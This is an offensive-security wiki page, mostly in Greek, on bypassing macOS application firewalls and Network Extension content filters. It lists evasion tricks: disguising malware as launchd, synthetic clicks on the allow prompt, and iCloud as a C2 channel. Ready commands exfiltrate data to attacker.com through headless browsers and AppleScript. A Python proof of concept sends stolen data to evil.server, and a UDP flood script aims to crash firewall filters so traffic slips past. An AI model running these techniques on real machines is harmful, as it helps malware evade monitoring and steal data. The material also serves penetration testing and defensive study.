# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Βρέθηκαν τεχνικές

Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε κάποιες macOS firewall apps.

### Abusing whitelist names

- Για παράδειγμα, ονομάζοντας το malware με ονόματα γνωστών macOS διεργασιών όπως **`launchd`**

### Synthetic Click

- Αν το firewall ζητήσει άδεια από τον χρήστη, κάνε το malware να **κλικάρει στο allow**

### **Use Apple signed binaries**

- Like **`curl`**, but also others like **`whois`**

### Well known apple domains

Το firewall μπορεί να επιτρέπει συνδέσεις σε γνωστά apple domains όπως **`apple.com`** ή **`icloud.com`**. Το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.

### Generic Bypass

Μερικές ιδέες για να προσπαθήσετε να παρακάμψετε firewalls

### Check allowed traffic

Η γνώση της επιτρεπόμενης κίνησης θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές έχουν δικαίωμα πρόσβασης σε αυτά
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση DNS

Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα έχει άδεια να επικοινωνεί με τους διακομιστές DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω processes injections

Αν μπορείτε να **inject code into a process** που επιτρέπεται να συνδεθεί σε οποιονδήποτε server, μπορείτε να παρακάμψετε τις προστασίες του firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Πρόσφατες macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Τον Ιούλιο του 2024 η Apple διόρθωσε ένα κρίσιμο σφάλμα στο Safari/WebKit που έσπασε το system-wide “Web content filter” που χρησιμοποιείται από τα Screen Time parental controls.
Ένα ειδικά κατασκευασμένο URI (π.χ. με διπλά URL-encoded “://”) δεν αναγνωρίζεται από το Screen Time ACL αλλά γίνεται αποδεκτό από το WebKit, οπότε το request αποστέλλεται χωρίς φιλτράρισμα. Οποιοδήποτε process που μπορεί να ανοίξει ένα URL (συμπεριλαμβανομένου sandboxed ή unsigned code) μπορεί επομένως να φτάσει domains που έχουν ρητά μπλοκαριστεί από τον χρήστη ή από ένα MDM profile.

Πρακτικό τεστ (μη patched σύστημα):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Σφάλμα στην ταξινόμηση κανόνων του Packet Filter (PF) στις πρώιμες εκδόσεις του macOS 14 “Sonoma”
Κατά τη διάρκεια του beta κύκλου του macOS 14, η Apple εισήγαγε μια παλινδρόμηση στο userspace wrapper γύρω από **`pfctl`**.
Κανόνες που προστέθηκαν με τη λέξη-κλειδί `quick` (που χρησιμοποιείται από πολλά VPN kill-switches) αγνοήθηκαν σιωπηλά, προκαλώντας traffic leaks ακόμη και όταν το GUI του VPN/firewall ανέφερε *blocked*. Το σφάλμα επιβεβαιώθηκε από αρκετούς προμηθευτές VPN και διορθώθηκε στο RC 2 (build 23A344).

Γρήγορος έλεγχος για leaks:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Κατάχρηση Apple-signed helper services (legacy – pre-macOS 11.2)
Πριν από το macOS 11.2 το **`ContentFilterExclusionList`** επέτρεπε ~50 Apple binaries όπως το **`nsurlsessiond`** και το App Store να παρακάμπτουν όλα τα socket-filter firewalls που υλοποιούνται με το Network Extension framework (LuLu, Little Snitch, κ.λπ.).
Malware μπορούσε απλά να spawn ένα excluded process — ή να inject code σε αυτό — και να tunnel την κίνησή του πάνω από το ήδη-επιτρεπόμενο socket. Η Apple αφαίρεσε πλήρως τη λίστα εξαιρέσεων στο macOS 11.2, αλλά η τεχνική εξακολουθεί να είναι σχετική σε συστήματα που δεν μπορούν να αναβαθμιστούν.

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH για να παρακάμψετε τα Network Extension domain filters (macOS 12+)
Οι NEFilter Packet/Data Providers βασίζονται στο TLS ClientHello SNI/ALPN. Με **HTTP/3 over QUIC (UDP/443)** και **Encrypted Client Hello (ECH)** το SNI παραμένει κρυπτογραφημένο, το NetExt δεν μπορεί να αναλύσει τη ροή, και οι κανόνες hostname συχνά fail-open, επιτρέποντας στο malware να φτάσει σε μπλοκαρισμένα domains χωρίς να αγγίξει το DNS.

Ελάχιστο PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Αν το QUIC/ECH είναι ακόμα ενεργό, αυτό είναι ένας εύκολος τρόπος παράκαμψης hostname-filter.

### Αστάθεια του macOS 15 “Sequoia” Network Extension (2024–2025)
Οι πρώιμες builds 15.0/15.1 προκαλούν συντριβή στα τρίτων **Network Extension** φίλτρα (LuLu, Little Snitch, Defender, SentinelOne, κ.ά.). Όταν το φίλτρο επανεκκινηθεί, το macOS απορρίπτει τα flow rules του και πολλά προϊόντα fail‑open. Η πλημμύρα του φίλτρου με χιλιάδες σύντομες ροές UDP (ή ο εξαναγκασμός του QUIC/ECH) μπορεί να προκαλέσει επανειλημμένα τη συντριβή και να αφήσει παράθυρο για C2/exfil ενώ το GUI εξακολουθεί να ισχυρίζεται ότι το firewall τρέχει.

Γρήγορη αναπαραγωγή (ασφαλές εργαστηριακό μηχάνημα):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Συμβουλές εργαλείων για το σύγχρονο macOS

1. Επιθεωρήστε τους τρέχοντες κανόνες PF που δημιουργούν τα GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Καταγράψτε τα binaries που ήδη διαθέτουν το *outgoing-network* entitlement (χρήσιμο για piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Καταχωρήστε προγραμματικά τον δικό σας Network Extension content filter σε Objective-C/Swift.
Ένα ελάχιστο rootless PoC που προωθεί πακέτα σε ένα local socket είναι διαθέσιμο στον πηγαίο κώδικα του Patrick Wardle’s **LuLu**.

## Αναφορές

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
